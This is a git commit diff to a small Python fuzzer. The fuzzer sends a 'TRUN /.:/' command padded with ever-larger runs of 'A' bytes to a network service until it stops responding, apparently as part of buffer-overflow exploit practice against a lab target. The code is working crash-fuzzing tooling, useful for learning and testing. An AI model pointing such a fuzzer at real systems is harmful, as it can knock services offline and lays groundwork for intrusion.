9b8162f49ab614c1255ffccb20673a73b284e3cd
Sizerino <myultisreadylol@gmail.com>
2024-06-19 16:58:53 +0300

    Updated fuzzer.py

--- scripts/fuzzer.py
+++ scripts/fuzzer.py
@@ -2,38 +2,39 @@ import socket
 
 
 def fuzz(host, port):
-    buffersize = 0
+    buffersize = 100
 
     try:
         while True:
             buffer = b"".join([
                 b"TRUN",
                 b" ",
-                b".",
+                b"/.:/",
                 b"A" * buffersize
             ])
 
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
+            sock = socket.socket(
+                socket.AF_INET,
+                socket.SOCK_STREAM
+            )
+            sock.settimeout(3)
 
             sock.connect((host, port))
 
             sock.send(buffer)
             print(
-                "Transmiting {} bytes: {}".format(buffersize, buffer)
+                "Transmitting {} bytes: {}".format(buffersize, buffer)
             )
 
             sock.recv(1024)
             sock.close()
-            buffersize += 10
+            buffersize += 200
 
     except socket.error:
         if buffersize == 0:
-            print("Couldn't connect to socket, end of life")
+            print("Couldn't connect to socket")
 
         else:
             print(
                 "Socket reached end of life around {} bytes".format(buffersize)
             )
-
-# fuzz("192.168.31.128", 9999)
